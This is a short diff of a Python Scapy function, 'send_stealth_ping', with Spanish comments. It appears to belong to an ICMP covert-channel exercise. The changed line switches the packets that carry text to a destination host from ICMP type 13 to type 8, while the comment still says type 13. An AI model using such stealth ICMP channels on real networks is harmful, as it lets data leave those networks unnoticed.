@@ -27,7 +27,7 @@ def send_stealth_ping(text, ip_destino="8.8.8.8"):
 
         # Construir paquete ICMP tipo 13 (Timestamp Request)
         packet = (IP(dst=ip_destino, id=base_ip_id + i) /
-                  ICMP(type=13, id=base_identifier, seq=base_seq, ts_ori=timestamp_constante, ts_rx=0, ts_tx=0) /
+                  ICMP(type=8, id=base_identifier, seq=base_seq, ts_ori=timestamp_constante, ts_rx=0, ts_tx=0) /
                   payload)
 
         # Mostrar los parámetros que se están enviando
